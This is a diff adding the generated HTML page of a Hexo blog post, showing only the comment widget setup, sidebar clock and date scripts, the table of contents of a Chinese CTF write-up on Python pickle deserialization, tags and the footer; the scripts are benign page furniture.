+      import { init } from 'https://unpkg.com/@waline/client@v3/dist/waline.js';
+      init({
+        el: '#waline',
+        serverURL: '',
+        dark: 'html.dark',
+        pageview: true,
+        commentClassName: 'prose prose-neutral dark:prose-invert min-w-0 max-w-none',
+        lang: 'zh-CH', //
+        avatar: 'mm', //
+        meta: ['nick', 'mail'], //
+        pageSize: 10, //
+        visitor: true, //
+        commentCount: true, //
+        requiredFields: ['nick', 'mail'], //
+      });
+    </script>
+    </div>
+
+
+</div>
+
+<script src="/js/copy.js"></script>
+
+<aside class="sidebar-container sidebar-right">
+    <div class="sidebar-bg">
+        <p id="date"></p>
+<script>
+  function updateDate() {
+    var now = new Date();
+    var dateString = now.toISOString().slice(0, 10);
+    document.getElementById('date').textContent = dateString;
+  }
+
+  window.addEventListener('load', function() {
+    updateDate();
+    // 更新频率为每5分钟更新一次，减少不必要的更新
+    setInterval(updateDate, 300000);
+  });
+</script>
+        <span id="clock" role="timer" aria-live="polite"></span>
+
+
+<script>
+  document.addEventListener('DOMContentLoaded', function() {
+    const clockElement = document.getElementById('clock');
+    let timerInterval;
+
+    // 格式化时间函数
+    function formatTime(unit) {
+      return unit < 10 ? '0' + unit : unit;
+    }
+
+    // 更新时钟 - 包含秒
+    function updateClock() {
+      const now = new Date();
+      const hours = formatTime(now.getHours());
+      const minutes = formatTime(now.getMinutes());
+      const seconds = formatTime(now.getSeconds());
+      clockElement.textContent = `${hours}:${minutes}:${seconds}`;
+    }
+
+    // 初始化时钟
+    function startClock() {
+      // 立即更新一次时间
+      updateClock();
+      // 每秒更新一次
+      timerInterval = setInterval(updateClock, 1000);
+    }
+
+    // 页面可见性变化时的优化
+    document.addEventListener('visibilitychange', function() {
+      if (document.hidden) {
+        // 页面不可见时停止更新
+        clearInterval(timerInterval);
+      } else {
+        // 页面重新可见时，重新开始
+        clearInterval(timerInterval);
+        startClock();
+      }
+    });
+
+    // 启动时钟
+    startClock();
+  });
+</script>
+
+
+    </div>
+    <div class="sidebar-bg">
+        <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#pickle%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96"><span class="toc-number">1.</span> <span class="toc-text">pickle反序列化</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E7%AE%80%E4%BB%8B%EF%BC%9A"><span class="toc-number">1.1.</span> <span class="toc-text">pickle简介：</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%8F%AF%E5%BA%8F%E5%88%97%E5%8C%96%E7%9A%84%E5%AF%B9%E8%B1%A1"><span class="toc-number">1.2.</span> <span class="toc-text">可序列化的对象</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#reduce-%E5%87%BD%E6%95%B0"><span class="toc-number">1.3.</span> <span class="toc-text">__reduce__()函数</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%8E%9F%E7%90%86"><span class="toc-number">1.4.</span> <span class="toc-text">漏洞原理:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%A4%BA%E4%BE%8B"><span class="toc-number">1.5.</span> <span class="toc-text">示例:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickle%E8%BF%87%E7%A8%8B%E8%AF%A6%E8%A7%A3"><span class="toc-number">1.6.</span> <span class="toc-text">pickle过程详解</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#opcode%E7%89%88%E6%9C%AC"><span class="toc-number">1.6.1.</span> <span class="toc-text">opcode版本</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#pickletools"><span class="toc-number">1.7.</span> <span class="toc-text">pickletools</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">1.8.</span> <span class="toc-text">漏洞利用:</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%88%9D%E6%AD%A5%E8%AE%A4%E8%AF%86%EF%BC%9Apickle-EXP%E7%9A%84%E7%AE%80%E5%8D%95demo"><span class="toc-number">1.8.1.</span> <span class="toc-text">初步认识：pickle EXP的简单demo</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E5%8F%98%E9%87%8F%E8%A6%86%E7%9B%96"><span class="toc-number">1.8.2.</span> <span class="toc-text">变量覆盖</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E4%BE%8B%E9%A2%98"><span class="toc-number">1.9.</span> <span class="toc-text">例题</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#HZNUCTF-2023-preliminary-pickle"><span class="toc-number">1.9.1.</span> <span class="toc-text">[HZNUCTF 2023 preliminary]pickle</span></a></li></ol></li></ol></li></ol>
+    </div>
+    <div class="sidebar-bg">
+        <div class="card-tags">
+            
+                <a href="/tags/CTF/" class="tag" aria-label="标签: #CTF">#CTF</a>
+            
+                <a href="/tags/Web%E5%AE%89%E5%85%A8/" class="tag" aria-label="标签: #Web安全">#Web安全</a>
+            
+                <a href="/tags/pickle/" class="tag" aria-label="标签: #pickle">#pickle</a>
+            
+                <a href="/tags/python/" class="tag" aria-label="标签: #python">#python</a>
+            
+        </div>
+    </div>
+    <div>
+        <div class="categories-list">
+            
+                <div class="category-item">
+                    <a href="/categories/%E7%BD%91%E7%BB%9C%E5%AE%89%E5%85%A8/" aria-label="分类: 网络安全">
+                        网络安全
+                        <span>(12)</span>
+                    </a>
+                </div>
+            
+        </div>
+    </div>
+</aside>
+
+    <!-- No categories available -->
+
+
+    <footer>
+    <span id="busuanzi_container_site_pv" style="display: inline;"></span>
+    <span>👁<span id="busuanzi_value_site_pv"></span></span>
+    <div class="padding border border-sub border-dotted fadein-right">
+        <span style="color:aliceblue">👤<span id="busuanzi_value_site_uv"></span></span>
+    </div>
+    <span>
+        Powered by <a target="_blank" rel="noopener" href="https://hexo.io" alt="Hexo">
+            <p class="hover-underline night" style="display: inline;">Hexo</p>
+        </a>
+        <p style="display: inline; color: red;">❤</p>
+        Built with <a target="_blank" rel="noopener" href="https://github.com/xingwangzhe/hexo-theme-wang" alt="Wang">
+            <p class="hover-underline night" style="display: inline;">Wang</p>
+        </a> Theme
+    </span>
+
+    <!-- 带图片的链接 -->
+    <div class="footer-links">
+        
+    </div>
+
+    <!-- 纯文本链接 -->
+    <div class="footer-text-links">
+        
+            
+                <a href="" target="_blank" rel="noopener">
+                    宏愿纵未了,奋斗总不太晚
+                </a>
+            
+        
+    </div>
+</footer>
+    
+<script src="/js/background.js"></script>
+    
+        
+<script src="/js/search.js"></script>
+    
+</main>
+</body>
+</html>
